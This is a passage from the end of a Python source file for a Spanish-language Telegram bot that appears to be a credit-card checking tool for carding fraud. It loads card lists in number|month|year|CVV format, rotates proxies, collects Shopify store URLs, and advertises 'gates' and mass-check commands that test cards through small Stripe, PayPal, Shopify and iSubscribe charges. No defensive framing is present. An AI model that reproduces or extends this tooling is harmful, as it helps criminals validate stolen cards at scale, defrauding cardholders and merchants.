        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_tarjetas()
        )

def procesar_add_proxy(message):
    proxy = message.text.strip()
    if guardar_proxy(proxy):
        texto = (
            "╔════════════════════════════╗\n"
            "║     ✅ PROXY GUARDADO      ║\n"
            "╠════════════════════════════╣\n"
            f"║  {proxy[:30]}{'...' if len(proxy)>30 else ''}  ║\n"
            "╚════════════════════════════╝"
        )
    else:
        texto = "❌ Error: El proxy ya existe"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_del_proxy(message):
    proxy = message.text.strip()
    if eliminar_proxy(proxy):
        texto = f"✅ Proxy eliminado: {proxy[:30]}"
    else:
        texto = "❌ Proxy no encontrado"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_add_sitio(message):
    url = message.text.strip()
    if guardar_sitio(url):
        texto = (
            "╔════════════════════════════╗\n"
            "║     ✅ SITIO GUARDADO      ║\n"
            "╠════════════════════════════╣\n"
            f"║  {url[:30]}{'...' if len(url)>30 else ''}  ║\n"
            "╚════════════════════════════╝"
        )
    else:
        texto = "❌ Error: El sitio ya existe o URL inválida"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_del_sitio(message):
    url = message.text.strip()
    if eliminar_sitio(url):
        texto = f"✅ Sitio eliminado: {url[:30]}"
    else:
        texto = "❌ Sitio no encontrado"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_del_tarjeta(message):
    tarjeta = message.text.strip()
    if eliminar_tarjeta(tarjeta):
        texto = f"✅ Tarjeta eliminada: {tarjeta[:20]}..."
    else:
        texto = "❌ Tarjeta no encontrada"
    
    bot.reply_to(message, texto, reply_markup=menu_tarjetas())

# ==================== COMANDOS DE LISTADO ====================

def listar_tarjetas(message):
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.send_message(message.chat.id, "📭 No hay tarjetas guardadas", reply_markup=menu_principal())
        return
    
    texto = "╔════════════════════════════╗\n║     💳 MIS TARJETAS      ║\n╠════════════════════════════╣\n"
    
    for cc, fecha, veces in tarjetas[:10]:
        fecha_corta = fecha[5:16] if fecha else "?"
        cc_short = cc[:10] + "..." + cc[-4:] if len(cc) > 15 else cc
        texto += f"║ 💳 {cc_short:<20} ║\n║    └ {fecha_corta} [{veces} veces] ║\n"
    
    texto += f"╠════════════════════════════╣\n║ 📊 Total: {len(tarjetas)} tarjetas        ║\n╚════════════════════════════╝"
    
    bot.send_message(message.chat.id, texto, reply_markup=menu_tarjetas())

def listar_proxies(message):
    proxies = obtener_proxies_con_estadisticas()
    
    if not proxies:
        bot.send_message(message.chat.id, "📭 No hay proxies guardados", reply_markup=menu_principal())
        return
    
    texto = "╔════════════════════════════╗\n║     🌐 MIS PROXIES       ║\n╠════════════════════════════╣\n"
    
    for proxy, succ, fail, last_test, status in proxies[:10]:
        proxy_short = proxy[:20] + "..." if len(proxy) > 20 else proxy
        
        # Determinar emoji según status
        if status == 'alive':
            status_emoji = "✅"
        elif status == 'slow':
            status_emoji = "🐢"
        elif status == 'dead':
            status_emoji = "❌"
        else:
            status_emoji = "⏳"
        
        texto += f"║ {status_emoji} {proxy_short:<22} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 Último test: {last_test[-8:] if last_test else 'N/A'} ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto, reply_markup=menu_proxies())

# ==================== ARCHIVOS ====================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Solo acepto archivos .txt")
        return
    
    msg = bot.reply_to(message, "📦 Procesando archivo...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        contenido = downloaded_file.decode('utf-8')
        
        # Detectar tipo de contenido
        lineas = contenido.strip().split('\n')
        es_tarjeta = False
        es_proxy = False
        es_sitio = False
        
        for linea in lineas[:5]:  # Revisar primeras 5 líneas
            linea = linea.strip()
            if '|' in linea and len(linea.split('|')) == 4:
                es_tarjeta = True
            elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', linea):
                es_proxy = True
            elif re.match(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$', linea):
                es_sitio = True
        
        if es_tarjeta and not es_proxy and not es_sitio:
            # Es archivo de tarjetas
            guardadas, repetidas, invalidas = guardar_tarjetas_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ TARJETAS CARGADAS    ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardadas: {guardadas:<4}             ║\n"
                f"║ 🔁 Repetidas: {repetidas:<4}             ║\n"
                f"║ ❌ Inválidas: {invalidas:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_proxy:
            # Es archivo de proxies
            guardados, repetidos, invalidos = guardar_proxies_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ PROXIES CARGADOS     ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_sitio:
            # Es archivo de sitios Shopify
            guardados, repetidos, invalidos = guardar_sitios_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ SITIOS CARGADOS      ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        else:
            texto = "❌ No se pudo identificar el tipo de archivo. Debe ser:\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: https://tienda.myshopify.com"
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, msg.message_id)

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/cancelar_'))
def cancelar_tarea(message):
    task_id = message.text.replace('/cancelar_', '')
    
    if task_id in active_tasks:
        active_tasks[task_id]['cancel'] = True
        bot.reply_to(message, f"🛑 Cancelando tarea {task_id}...")
    else:
        bot.reply_to(message, f"❌ Tarea no encontrada")

@bot.message_handler(func=lambda m: True)
def default(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❓ Comando no reconocido. Usa /menu")
    else:
        bot.reply_to(message, "❓ Usa /menu para ver las opciones")

if __name__ == "__main__":
    print("="*80)
    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA + iSubscribe UK")
    print("="*80)
    print("✅ Gates disponibles:")
    print("   • Stripe $1 No AVS  → /check5")
    print("   • PayPal: $10       → /pp")
    print("   • PayPal: $0.10     → /pp2")
    print("   • PayPal: $1        → /pp3")
    print("   • AutoShopify       → /sh")
    print("   • iSubscribe UK £4  → /uk (NUEVO!)")
    print("="*80)
    print("✅ Comandos masivos:")
    print("   • Stripe masivo     → /mass")
    print("   • PayPal masivo     → /mpp (SOLO $0.10)")
    print("   • Shopify masivo    → /msh (con limpieza)")
    print("   • iSubscribe masivo → /muk (NUEVO!)")
    print("="*80)
    print("✅ Proxies:")
    print("   • /px - Test ULTRA RÁPIDO")
    print("   • /proxies - Ver lista")
    print("="*80)
    print("✅ Sitios:")
    print("   • /cleansites - Limpiar sitios muertos")
    print("="*80)
    print("📱 Usa /menu para comenzar")
    print("="*80)
    
    # Mantener el bot corriendo
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"❌ Error en polling: {e}")
            time.sleep(5)
